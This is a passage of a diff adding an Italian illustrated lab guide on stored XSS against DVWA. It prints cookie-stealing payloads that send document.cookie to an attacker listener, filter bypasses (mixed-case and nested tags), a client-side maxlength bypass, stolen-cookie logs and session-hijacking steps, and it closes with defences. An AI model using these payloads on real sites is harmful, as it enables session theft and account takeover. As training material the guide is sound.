+      <tr>
+        <td class="mono">fetch(url)</td>
+        <td>API moderna per fare richieste HTTP da JavaScript</td>
+        <td>Più leggibile, standard contemporaneo, accetta opzioni avanzate (POST, header custom)</td>
+      </tr>
+      <tr>
+        <td class="mono">btoa(str)</td>
+        <td>Binary-to-ASCII: codifica la stringa in <strong>Base64</strong></td>
+        <td>Il cookie diventa una stringa di sole lettere, numeri e pochi simboli: zero rischio di rompere l'URL</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="metaphor">
+    <p>È come impacchettare il braccialetto in una busta cifrata prima di darla al piccione. All'arrivo, Bob apre la busta e legge il contenuto. Il piccione intanto ha volato più tranquillo, senza perdere pezzi lungo la strada.</p>
+  </div>
+
+  <p>Ecco come appaiono i due formati nella cassetta postale di Bob, affiancati:</p>
+
+  <pre data-label="Richieste ricevute dal listener">GET /?c=security=low; PHPSESSID=3h7k9abc2def4xyz
+                                              ^ in chiaro, dal payload #1
+
+GET /?cookie=c2VjdXJpdHk9bG93OyBQSFBTRVNTSUQ9M2g3azlhYmMyZGVmNHh5eg==
+                                              ^ base64, dal payload #2</pre>
+
+  <p>Per decodificare la versione base64 basta una riga di terminale:</p>
+
+  <pre data-label="Decodifica Base64 manuale">$ echo "c2VjdXJpdHk9bG93OyBQSFBTRVNTSUQ9M2g3azlhYmMyZGVmNHh5eg==" | base64 -d
+security=low; PHPSESSID=3h7k9abc2def4xyz</pre>
+
+  <div class="tip-box">
+    <p>Il nostro listener Flask fa la decodifica <strong>automaticamente</strong> e salva sia la forma codificata sia quella in chiaro nel log. <code>base64 -d</code> resta una tecnica utile da conoscere per qualsiasi contesto in cui ti trovi davanti a una stringa sospetta e vuoi capire se c'è dentro qualcosa di leggibile.</p>
+  </div>
+</article>
+
+<!-- CAPITOLO 7 -->
+<article class="chapter" id="cap7">
+  <div class="chapter-num">Capitolo 07</div>
+  <h2>Alice entra nel bar e <em>legge la bacheca</em>.</h2>
+
+  <p>Bob ha il listener acceso, ha appeso il biglietto. Ora basta aspettare. La trappola è innescata e in attesa di una vittima.</p>
+
+  <p>Entra in scena <strong>Alice</strong>. Alice è un'utente normale di DVWA: ha una sua password, le sue abitudini, non sa niente di Bob. Si collega, fa login con le sue credenziali (nel nostro lab: <code>gordonb</code> / <code>abc123</code>), e per curiosità apre il guestbook per vedere cosa scrivono gli altri.</p>
+
+  <div class="flow-diagram">
+<span class="actor-a">Bob (Kali 192.168.104.100)</span>                  <span class="actor-s">DVWA (Metasploitable 150)</span>              <span class="actor-v">Alice (victim browser)</span>
+      |                                       |                                   |
+      |  [1] inietta &lt;script&gt; nel guestbook    |                                   |
+      |  <span class="arrow">──────────────────────────────────▶</span>    |                                   |
+      |                                       | [2] salva payload in DB MySQL     |
+      |                                       |                                   |
+      |                                       |         [3] Alice apre la pagina  |
+      |                                       |    <span class="arrow">◀──────────────────────────────</span>|
+      |                                       | [4] risponde con HTML            |
+      |                                       | (payload incluso nella pagina)   |
+      |                                       |    <span class="arrow">──────────────────────────────▶</span>|
+      |                                       |                                   |
+      |                                       |         [5] browser esegue lo script
+      |                                       |             → fa GET /?c=...       |
+      | [6] listener riceve il cookie         |                                   |
+      |  <span class="arrow">◀──────────────────────────────────────────────────────────────────────────</span>|
+      |                                       |                                   |
+      | [7] Bob ha il PHPSESSID di Alice      |                                   |
+  </div>
+
+  <p><strong>Alice non clicca niente di strano. Non scarica niente. Non inserisce la password una seconda volta.</strong> Basta che apra la pagina del guestbook. Il suo browser incontra il tag <code>&lt;script&gt;</code> nel messaggio di Bob e, da bravo maggiordomo obbediente, lo esegue.</p>
+
+  <p>Sullo schermo del listener di Bob appare questo:</p>
+
+  <div class="term-mock">
+    <div class="term-top">
+      <div class="dot red"></div>
+      <div class="dot yel"></div>
+      <div class="dot grn"></div>
+      <span class="title">cookie_catcher.py — Kali Terminal</span>
+    </div>
+    <div class="term-body"><span class="danger">╔══════════ 🍪 COOKIE STOLEN ══════════╗</span>
+  <span class="cyan">Timestamp  :</span> 2026-04-20T14:32:15+00:00
+  <span class="cyan">Client IP  :</span> 192.168.104.150
+  <span class="cyan">User-Agent :</span> Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0
+  <span class="cyan">Referer    :</span> http://192.168.104.150/dvwa/vulnerabilities/xss_s/
+  <span class="cyan">Method     :</span> GET /
+  <span class="cyan">Payload    :</span> Image()/raw
+  <span class="warn">Cookie RAW :</span> security=low; PHPSESSID=3h7k9abc2def4xyz
+  <span class="ok">Cookie DEC :</span> security=low; PHPSESSID=3h7k9abc2def4xyz
+<span class="danger">╚═══════════════════════════════════════╝</span></div>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/flask_02-B.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 4 — Listener che riceve il primo cookie
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 8 -->
+<article class="chapter" id="cap8">
+  <div class="chapter-num">Capitolo 08</div>
+  <h2>Bob diventa Alice. <em>Senza sapere la sua password.</em></h2>
+
+  <p>Adesso Bob ha nelle mani il <code>PHPSESSID</code> di Alice. Il braccialetto. Gli basta <strong>indossarlo</strong> e il sito lo scambierà per lei.</p>
+
+  <p>Apre il suo browser (anche in una sessione incognito per non sovrascrivere la sua sessione reale), va sul dominio di DVWA, apre gli strumenti per sviluppatori con <kbd>F12</kbd> e sostituisce il proprio cookie con quello appena rubato.</p>
+
+  <div class="story-grid">
+    <div class="num">1</div>
+    <div>
+      <h4>Apre la scheda Storage → Cookies</h4>
+      <p>Nella sezione dedicata ai cookie del dominio DVWA vede il proprio <code>PHPSESSID</code>.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">2</div>
+    <div>
+      <h4>Click sul valore, incolla quello di Alice</h4>
+      <p>Sostituisce il valore attuale con <code>3h7k9abc2def4xyz</code>. Enter per confermare.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">3</div>
+    <div>
+      <h4>Ricarica la pagina</h4>
+      <p>La dashboard DVWA lo saluta come <strong>gordonb</strong>. Bob è ufficialmente dentro l'account di Alice. Può leggere i suoi messaggi, modificare le sue impostazioni, eseguire azioni al posto suo.</p>
+    </div>
+  </div>
+
+  <div class="danger-box">
+    <p>Questa tecnica è classificata nel framework MITRE ATT&amp;CK come <strong>T1539 — Steal Web Session Cookie</strong>. È una delle tecniche di <em>credential access</em> più efficaci perché bypassa completamente meccanismi come l'autenticazione a più fattori (MFA): una volta che la sessione è stata aperta dalla vittima, il cookie la identifica senza richiedere nuovi fattori.</p>
+  </div>
+</article>
+
+<!-- CAPITOLO 9 -->
+<article class="chapter" id="cap9">
+  <div class="chapter-num">Capitolo 09</div>
+  <h2>Livello medio: <em>il buttafuori un po' distratto</em>.</h2>
+
+  <p>Al livello <strong>Medium</strong>, gli sviluppatori di DVWA hanno capito che c'è un problema e hanno messo qualche difesa. Guardiamo cosa succede nel codice sorgente (DVWA stesso ci permette di vederlo con il pulsante <em>View Source</em>):</p>
+
+  <pre data-label="Codice PHP — xss_s livello Medium" class="highlight">$message = trim($_POST['mtxMessage']);
+$message = strip_tags(addslashes($message));
+$message = mysqli_real_escape_string(..., $message);
+$message = htmlspecialchars($message);
+
+$name = trim($_POST['txtName']);
+$name = str_replace('&lt;script&gt;', '', $name);
+$name = mysqli_real_escape_string(..., $name);</pre>
+
+  <h3>Due osservazioni critiche</h3>
+
+  <p><strong>Il campo <code>message</code> è ora ben protetto.</strong> Ha tre filtri in fila: rimuove tutti i tag HTML (<code>strip_tags</code>), escapa i caratteri speciali per il database, e riconverte tutto in entità HTML sicure (<code>htmlspecialchars</code>). Dentro <code>message</code> il nostro payload non passerebbe mai.</p>
+
+  <p><strong>Il campo <code>name</code>, invece, ha una sola "difesa":</strong> rimuove la sottostringa esatta <code>&lt;script&gt;</code>. Solo quella. In minuscolo. Una volta sola.</p>
+
+  <div class="metaphor">
+    <p>È come un buttafuori che ha ricevuto l'ordine di non far entrare chi si presenta con il nome "Script" scritto esattamente così, tutto in minuscolo. Chiunque scriva "SCRIPT", "Script" o "ScRiPt" passa senza problemi. Un filtro che controlla la forma esatta e non la sostanza è un filtro inutile.</p>
+  </div>
+
+  <div class="danger-box">
+    <p>Nel mondo reale, i filtri basati su <em>blacklist</em> di stringhe specifiche (<code>str_replace</code>, regex semplici, liste "nere" di parole proibite) sono una categoria di difesa notoriamente debole. Ne esistono decine di bypass documentati. La regola è: <strong>sempre whitelist, mai blacklist</strong>.</p>
+  </div>
+</article>
+
+<!-- CAPITOLO 10 -->
+<article class="chapter" id="cap10">
+  <div class="chapter-num">Capitolo 10</div>
+  <h2>Il trucco del <em>CaMeLcAsE</em>.</h2>
+
+  <p>C'è un dettaglio tecnico che cambia tutto. L'HTML è <strong>case-insensitive</strong> sui nomi dei tag: per il browser, <code>&lt;SCRIPT&gt;</code>, <code>&lt;Script&gt;</code>, <code>&lt;ScRiPt&gt;</code> e <code>&lt;script&gt;</code> sono esattamente la stessa cosa. Tutte e quattro le scritture producono un tag script valido ed eseguibile.</p>
+
+  <p>Il filtro PHP, però, è <strong>case-sensitive</strong>: cerca la stringa esatta <code>&lt;script&gt;</code> in minuscolo e rimuove solo quella.</p>
+
+  <div class="bypass-box">
+    <p>Mescolando maiuscole e minuscole nel tag, <em>inganniamo il filtro ma non inganniamo il browser</em>. Il filtro non vede nulla da rimuovere. Il browser, qualche millisecondo dopo, esegue il tag con grande naturalezza.</p>
+  </div>
+
+  <p>Il payload bypass è quasi identico a quello del livello LOW, cambia solo la grafia del tag:</p>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Bonus B1 — bypass case-insensitive</span>
+      <span class="level medium">MEDIUM</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Da inserire nel campo NAME (non in Message)">&lt;ScRiPt&gt;new Image().src='http://192.168.104.100:4444/?c='+document.cookie;&lt;/ScRiPt&gt;</pre>
+      <p class="qc-caption">Stessa logica del payload LOW, ma va nel campo <em>Name</em> (dove il filtro è debole) invece che in <em>Message</em> (dove è robusto), e il tag è in <em>CaMeLcAsE</em> per aggirare <code>str_replace</code>.</p>
+    </div>
+  </div>
+
+  <h3>Piccolo ostacolo: il <code>maxlength</code></h3>
+
+  <p>Il campo <em>Name</em> nel form HTML ha un attributo <code>maxlength="10"</code>: il browser ti impedisce di scriverci più di 10 caratteri. Il nostro payload ne è lungo 115.</p>
+
+  <p>Ma <code>maxlength</code> è un vincolo <strong>solo lato client</strong>. Il server non ne sa nulla e accetta input di qualsiasi lunghezza. Possiamo quindi modificare l'HTML del form al volo con gli strumenti per sviluppatori:</p>
+
+  <div class="story-grid">
+    <div class="num">F12</div>
+    <div>
+      <h4>Apri DevTools → Inspector</h4>
+      <p>Individua il campo <code>&lt;input name="txtName"&gt;</code> nell'HTML della pagina.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">✏️</div>
+    <div>
+      <h4>Tasto destro → Edit as HTML</h4>
+      <p>Cambia <code>maxlength="10"</code> in <code>maxlength="500"</code> e conferma con Enter.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">✓</div>
+    <div>
+      <h4>Incolla il payload lungo e invia</h4>
+      <p>Il form ora accetta il testo senza troncare. Il server lo riceve, il filtro non trova <code>&lt;script&gt;</code> esatto da rimuovere, il payload viene salvato integro. Alice, appena apre la pagina, consegna nuovamente il cookie a Bob.</p>
+    </div>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_04.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 5 — DevTools: bypass del maxlength + payload CaMeLcAsE
+  </p>
+</div>
+
+  <h3>Un secondo bypass, per eleganza: <em>recursion</em></h3>
+
+  <p>Esiste un modo ancora più astuto. La funzione <code>str_replace</code> fa <strong>una sola passata</strong>, non ricorsiva. Se il filtro incontra <code>&lt;script&gt;</code>, lo cancella e va avanti — non torna indietro a controllare se la cancellazione ha creato un <em>nuovo</em> <code>&lt;script&gt;</code> dal testo residuo. Possiamo sfruttare questa svista:</p>
+
+  <pre data-label="Payload che si "ricostruisce" dopo il filtro">&lt;scr&lt;script&gt;ipt&gt;new Image().src='http://192.168.104.100:4444/?c='+document.cookie;&lt;/scr&lt;/script&gt;ipt&gt;</pre>
+
+  <p>Dopo che il filtro rimuove il <code>&lt;script&gt;</code> centrale, quello che rimane è... <code>&lt;script&gt;</code>. Il pattern si auto-ricompone a valle del filtro, come un origami che si piega da solo.</p>
+</article>
+
+<!-- CAPITOLO 11 -->
+<article class="chapter" id="cap11">
+  <div class="chapter-num">Capitolo 11</div>
+  <h2>Cosa abbiamo catturato: <em>il dump completo</em>.</h2>
+
+  <p>Il listener Flask non è un semplice "eco" della porta: ogni richiesta viene <strong>analizzata, arricchita e archiviata</strong>. Per ogni vittima registriamo:</p>
+
+  <table class="table-query">
+    <thead>
+      <tr><th>Campo</th><th>Dove viene preso</th><th>A cosa serve</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">timestamp_utc</td><td>Orologio del server</td><td>Ricostruire la timeline dell'attacco</td></tr>
+      <tr><td class="mono">client_ip</td><td><code>request.remote_addr</code></td><td>Identificare la vittima sulla rete lab</td></tr>
+      <tr><td class="mono">user_agent</td><td>Header HTTP <em>User-Agent</em></td><td>Capire browser e sistema operativo</td></tr>
+      <tr><td class="mono">referer</td><td>Header HTTP <em>Referer</em></td><td>Verificare da quale pagina è partita la richiesta</td></tr>
+      <tr><td class="mono">cookie_raw</td><td>Query-string (<code>?c=</code> o <code>?cookie=</code>)</td><td>Il valore "sporco" così come arrivato</td></tr>
+      <tr><td class="mono">cookie_decoded</td><td>Decodifica Base64 automatica</td><td>Il valore leggibile, pronto per l'uso</td></tr>
+      <tr><td class="mono">payload_type</td><td>Euristica sul nome del parametro</td><td>Distinguere i due payload (Image vs fetch)</td></tr>
+    </tbody>
+  </table>
+
+  <p>Tutto viene scritto in tre posti contemporaneamente: la console (per l'operatore che sta guardando in diretta), un file <code>stolen_cookies.jsonl</code> (una riga JSON per evento, ottimo per tool di analisi automatica), un file <code>stolen_cookies.csv</code> (pronto da aprire in Excel per il report).</p>
+
+  <pre data-label="Esempio di riga in stolen_cookies.jsonl">{
+  "timestamp_utc": "2026-04-20T14:32:15+00:00",
+  "client_ip": "192.168.104.150",
+  "method": "GET",
+  "path": "/",
+  "query_string": "c=security%3Dlow%3B%20PHPSESSID%3D3h7k9abc...",
+  "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+  "referer": "http://192.168.104.150/dvwa/vulnerabilities/xss_s/",
+  "cookie_raw": "security=low; PHPSESSID=3h7k9abc2def4xyz",
+  "cookie_decoded": "security=low; PHPSESSID=3h7k9abc2def4xyz",
+  "payload_type": "Image()/raw"
+}</pre>
+
+  <div class="tip-box">
+    <p>Il listener risponde con una <strong>GIF trasparente 1×1 pixel</strong>. Serve per un motivo sottile: se il payload è <code>new Image().src = ...</code>, il browser si aspetta un'immagine in risposta. Rispondendo con una gif valida, evitiamo errori nella console JavaScript della vittima — l'attacco resta <em>silenzioso</em> e non attira l'attenzione di utenti tecnicamente curiosi.</p>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/flask_03-A.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 6 — File stolen_cookies.csv con 2-3 righe di cookie catturati, colonne timestamp, IP, UA, cookie visibili
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 12 -->
+<article class="chapter" id="cap12">
+  <div class="chapter-num">Capitolo 12</div>
+  <h2>Come difendersi. <em>Davvero.</em></h2>
+
+  <p>DVWA al livello LOW non ha nessuna difesa, al livello MEDIUM ne ha una che non serve a niente. Nel mondo reale, proteggere una web application da XSS richiede una strategia a livelli multipli. Vediamole in ordine di efficacia.</p>
+
+  <h3>1. Output encoding contestuale</h3>
+
+  <p>La vera difesa non è filtrare l'input — è <strong>codificare l'output</strong> nel momento in cui lo rimetti nella pagina. Se un utente scrive <code>&lt;script&gt;</code>, il server lo salva così com'è; ma quando lo rimostra a qualcun altro, lo trasforma in <code>&amp;lt;script&amp;gt;</code>. Il browser vede testo, non codice.</p>
+
+  <pre data-label="✅ PHP sicuro">echo htmlspecialchars($user_message, ENT_QUOTES, 'UTF-8');</pre>
+
+  <p>Questa singola funzione, usata coerentemente in ogni punto in cui si emette contenuto utente, rende quasi tutti gli XSS impossibili.</p>
+
+  <h3>2. Cookie con flag <code>HttpOnly</code></h3>
+
+  <p>È una singola riga di configurazione che rende invisibile il cookie a JavaScript. Anche se un XSS riesce a eseguirsi, <code>document.cookie</code> tornerà <strong>vuoto</strong> per i cookie HttpOnly. Il braccialetto c'è ma è coperto dalla manica.</p>
+
+  <pre data-label="Configurazione cookie sicuri">Set-Cookie: PHPSESSID=xyz; HttpOnly; Secure; SameSite=Strict</pre>
+
+  <div class="tip-box">
+    <p>DVWA non usa <code>HttpOnly</code> di proposito, per scopi didattici. Qualsiasi applicazione in produzione che salvi la sessione in un cookie <em>deve</em> avere questo flag attivo. Non è negoziabile.</p>
+  </div>
+
+  <h3>3. Content Security Policy (CSP)</h3>
+
+  <p>È un header HTTP che dice al browser: <em>"esegui script solo da questi domini, non da altri, e non da tag inline"</em>. È un secondo livello di difesa: se un XSS passa il primo strato, la CSP impedisce al browser di eseguire il codice iniettato perché non proviene da un'origine consentita.</p>
+
+  <pre data-label="Header CSP di base">Content-Security-Policy: default-src 'self'; script-src 'self'</pre>
+
+  <h3>4. Validazione dell'input per tipo</h3>
+
+  <p>Se il campo è "nome utente", non serve accettare <code>&lt;</code> o <code>&gt;</code>. Se è "età", deve essere solo un numero. Validare il tipo atteso ferma il 90% degli attacchi prima ancora che si arrivi al filtro.</p>
+
+  <h3>5. Web Application Firewall (WAF)</h3>
+
+  <p>Un WAF riconosce pattern tipici (<code>&lt;script&gt;</code>, <code>javascript:</code>, <code>onerror=</code>) e blocca le richieste a monte. Non è una soluzione definitiva (abbiamo appena visto quanti bypass esistono per i filtri più semplici) ma aggiunge uno strato di frizione utile.</p>
+
+  <div class="tip-box">
+    <p>La sicurezza di una web application non è mai una singola barriera. È una serie di porte, ognuna un po' più difficile dell'altra. Se una cade, le altre reggono abbastanza a lungo da dare tempo al team di rilevare l'attacco e reagire.</p>
+  </div>
+</article>
+
+<!-- FINALE -->
+<section class="finale">
+  <h2>Fine del<br><em>secondo colpo</em>.</h2>
+  <p>Hai appena seguito, dall'inizio alla fine, il secondo attacco più comune della storia del web. L'XSS è nella OWASP Top 10 dal 2003 e — pur avendo cambiato nome e categoria negli anni — continua a essere tra le vulnerabilità più frequentemente sfruttate in produzione.</p>
+  <p>Il meccanismo è semplice, la difesa è semplice, eppure si continuano a vedere applicazioni bucate. Il motivo? Basta dimenticarsi di <code>htmlspecialchars</code> in una sola pagina di un'applicazione da mille pagine.</p>
+  <p>Conoscere l'attacco ti rende un <strong>difensore più attento</strong>. Ogni volta che scriverai codice che riflette contenuto utente in una pagina, ricorderai cosa può succedere se non lo codifichi.</p>
+</section>
+
+<footer>
+  <span>Guida illustrata v2.0 · Task 02 · Build Week Cybersecurity</span>
+  <span class="classified">CONFIDENTIAL · Solo uso didattico in ambienti autorizzati</span>
+  <span>Team - DIGITAL AVENGERS</span>
+</footer>
+
+</body>
+</html>
